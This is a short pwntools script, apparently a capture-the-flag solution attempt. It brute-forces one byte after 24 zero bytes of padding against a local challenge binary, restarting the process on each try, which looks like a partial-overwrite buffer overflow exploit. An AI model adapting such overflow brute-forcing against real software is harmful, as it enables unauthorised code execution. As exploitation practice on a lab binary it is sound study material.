from pwn import *

r = process('./share/chal')

for i in range(0xff) :
    print(i)
    r = process('./share/chal')
    payload = p64(0) * 3 + int.to_bytes(i,1,'little')
    r.send(payload)



r.interactive()